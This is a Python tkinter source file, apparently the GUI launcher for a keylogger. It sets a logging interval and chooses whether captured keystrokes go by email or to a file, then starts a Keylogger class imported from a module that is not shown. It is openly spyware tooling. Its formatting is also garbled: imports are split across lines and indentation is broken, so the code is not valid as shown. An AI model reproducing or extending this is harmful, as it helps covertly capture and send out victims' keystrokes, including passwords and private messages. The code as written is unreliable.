from tkinter
import Label, ttk
import tkinter
from tkinter.constants
import LEFT, RIGHT
from ttkthemes
import ThemedTk
from keylogger
import Keylogger
class main(object):
    def __init__(self):
    self.root = ThemedTk(theme = "adapta")
self.root.title("Keylogger Application")
self.root.geometry('500x300')
self.root.iconbitmap('icon.ico')
self.value = tkinter.StringVar(value = "email")
self.interval = 5# in seconds
ttk.Style().configure("TButton", padding = 5, relief = "flat")
ttk.Label(self.root, text = "Send To :").pack(
    padx = 20, pady = 30, side = LEFT)
ttk.Checkbutton(self.root, text = 'email', variable = self.value,
    onvalue = 'email', offvalue = 'file').pack(side = LEFT)
ttk.Label(self.root, text = "Set the Interval to loop logging.").pack(
    pady = 20)
tkinter.Scale(self.root, from_ = 1, to = 60, orient = tkinter.HORIZONTAL,
    cursor = "hand2", takefocus = True,
    length = 200, variable = tkinter.IntVar(value = 5),
    command = self.change_interval).pack()
ttk.Label(self.root, text = "Default Interval : " +
    "5" + " seconds").pack()
ttk.Button(self.root, text = "Start",
    command = self.start).pack(pady = 30)
ttk.Button(self.root, text = "Quit",
    command = self.root.destroy).pack(pady = 10)
self.root.mainloop()
def change_interval(self, value_):
    self.interval = int(float(value_))
def start(self):
    Keylogger(interval = self.interval,
        report_method = self.value.get()).start()
if __name__ == '__main__':
    main()
